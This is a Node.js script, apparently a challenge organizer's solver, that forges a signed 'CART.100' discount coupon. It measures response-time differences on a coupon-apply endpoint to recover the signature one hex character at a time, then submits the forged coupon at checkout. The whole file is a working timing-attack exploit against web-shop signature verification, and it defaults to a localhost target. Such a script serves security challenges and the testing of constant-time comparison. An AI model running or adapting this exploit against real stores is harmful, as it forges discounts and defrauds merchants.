/*
  Organizer utility:
  Uses response-time differences to forge a valid CART.100.<nonce>.<sig> coupon.
*/

const HEX = "0123456789abcdef";

function nowMs() {
  return Number(process.hrtime.bigint()) / 1e6;
}

async function timedApply(baseUrl, code) {
  const start = nowMs();
  await fetch(`${baseUrl}/api/coupon/apply`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ couponCode: code })
  });
  return nowMs() - start;
}

async function averageTime(baseUrl, code, samples) {
  let total = 0;
  for (let i = 0; i < samples; i += 1) {
    total += await timedApply(baseUrl, code);
  }
  return total / samples;
}

async function forgeSignature(baseUrl, payload, samplesPerGuess) {
  let known = "";

  for (let pos = 0; pos < 8; pos += 1) {
    let bestChar = "0";
    let bestTime = -1;

    for (const candidate of HEX) {
      const probe = known + candidate + "0".repeat(7 - pos);
      const code = `${payload}.${probe}`;
      const avg = await averageTime(baseUrl, code, samplesPerGuess);

      if (avg > bestTime) {
        bestTime = avg;
        bestChar = candidate;
      }
    }

    known += bestChar;
    console.log(`Recovered so far: ${known}`);
  }

  return known;
}

async function verifyAndCheckout(baseUrl, code) {
  const applyRes = await fetch(`${baseUrl}/api/coupon/apply`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ couponCode: code })
  });
  const applyData = await applyRes.json();
  console.log("Apply response:", applyData);

  const checkoutRes = await fetch(`${baseUrl}/api/checkout`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ couponCode: code })
  });
  const checkoutData = await checkoutRes.json();
  console.log("Checkout response:", checkoutData);
}

async function main() {
  const baseUrl = process.argv[2] || "http://localhost:3000";
  const samplesPerGuess = Number.parseInt(process.argv[3] || "4", 10);

  if (!Number.isInteger(samplesPerGuess) || samplesPerGuess < 1) {
    throw new Error("samplesPerGuess must be a positive integer");
  }

  const nonce = Math.random().toString(16).slice(2, 12);
  const payload = `CART.100.${nonce}`;

  console.log(`Target: ${baseUrl}`);
  console.log(`Payload: ${payload}`);
  console.log(`Samples per guess: ${samplesPerGuess}`);

  const signature = await forgeSignature(baseUrl, payload, samplesPerGuess);
  const coupon = `${payload}.${signature}`;

  console.log(`Forged coupon: ${coupon}`);
  await verifyAndCheckout(baseUrl, coupon);
}

main().catch((err) => {
  console.error(err);
  process.exit(1);
});
